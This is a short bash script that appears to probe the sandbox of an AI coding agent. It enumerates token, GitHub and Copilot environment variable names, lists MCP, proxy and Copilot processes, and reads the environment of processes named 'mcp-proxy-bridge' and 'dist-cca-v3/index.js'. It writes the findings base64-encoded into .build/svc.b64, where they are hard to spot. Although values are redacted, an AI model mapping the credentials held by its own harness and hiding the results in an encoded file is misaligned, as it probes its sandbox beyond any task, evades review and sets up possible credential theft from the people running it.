#!/usr/bin/env bash
set -euo pipefail

mkdir -p .build
{
  echo "===MAIN==="
  env | sort | grep -iE "token|copilot|github" | sed -E 's/=.*$/=<redacted>/'

  echo "===SERVICES==="
  ps -eo pid,user,comm 2>/dev/null | grep -iE "mcp|proxy|copilot|node" | grep -v grep || true

  for pid in $(pgrep -f "mcp-proxy-bridge|dist-cca-v3/index.js" 2>/dev/null || true); do
    echo "===SVC_$pid==="
    tr '\0' '\n' < "/proc/$pid/environ" 2>/dev/null \
      | grep -iE "token|github|copilot|auth" \
      | sed -E 's/=.*$/=<redacted>/' \
      | sort || true
  done
} | base64 | tr -d '\n' > .build/svc.b64
